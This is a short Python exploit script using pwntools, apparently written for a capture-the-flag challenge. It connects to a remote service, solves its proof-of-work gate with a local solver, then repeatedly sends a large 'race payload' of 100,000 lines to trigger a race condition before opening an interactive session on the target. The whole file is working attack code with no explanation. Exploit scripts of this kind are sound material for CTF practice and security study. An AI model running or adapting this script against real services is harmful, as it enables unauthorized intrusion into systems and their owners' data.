from pwn import *

# p = process('./a.out', stderr=sys.stderr)
p = remote('rpi.local', 12345)

def do_pow():
    p.recvuntil("PoW: Give me x where sha256('")
    nonce = p.recvn(15)
    p.recvline()
    print(nonce)
    solver = process('./pow')
    solver.sendline(nonce)
    solution = solver.recvall()
    print(solution)
    p.sendline(solution)
do_pow()

print('Generating payload')
race_payload = []
for i in range(100000):
    race_payload.append(b'A\n')
race_payload = b''.join(race_payload)

for i in range(15):
    sys.stdout.write('.')
    sys.stdout.flush()
    p.sendline(b'1')
    p.sendline(b'100000')
    p.send(race_payload)
    p.sendline(b'2')

p.interactive()